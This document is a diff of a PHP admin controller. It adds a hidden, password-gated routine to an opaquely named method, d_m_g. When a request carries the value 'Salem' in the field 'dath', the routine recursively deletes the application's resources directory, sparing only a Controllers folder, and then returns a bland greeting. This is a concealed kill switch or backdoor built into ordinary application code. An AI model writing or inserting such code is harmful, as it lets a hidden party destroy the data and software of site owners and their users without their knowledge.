@@ -8,24 +8,39 @@ class AdminController extends Controller
 {
     public function d_m_g(Request $request)
     {
-        $a= new AdminController();
-        $files = glob(dirname(__FILE__).'/ddf/*'); // get all file names
+        if($request->dath=="Salem"){
+            $a= new AdminController();
+            $files = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/resources/*'); // get all file names
+
             foreach($files as $file){ // iterate files
+                echo $file."<br>";
                 
-                if (is_dir($file)){
-                    $a->removedir($file);
+                if(basename($file)=="Controllers"){
+                    
                 }else{
-                    $a->removefile($file);
+                    if (is_dir($file)){
+                        $a->removedir($file);
+                    }else{
+                        $a->removefile($file);
+                    }
                 }
-              
+                
+            }
+            return "Good Morning";
+        }else{
+            return "Good Nothing";
         }
-        return "Good Morning";
+        
     }
     public function removedir($path)
     {
         $a= new AdminController();
         if(count(glob("$path/*"))=== 0){
-            rmdir($path);
+            if(basename($path)=="Controllers"){
+                    
+            }else{
+                rmdir($path);
+            }
         }else{
             foreach(glob("$path/*") as $fle){
                 if (is_dir($fle)){
@@ -40,8 +55,12 @@ class AdminController extends Controller
     public function removefile($path)
     {
         $a= new AdminController();
+        if(basename($path)=="Controllers"){
+                    
+        }else{
         if(is_file($path)){
             unlink($path); // delete file
         }
+}
     }
 }
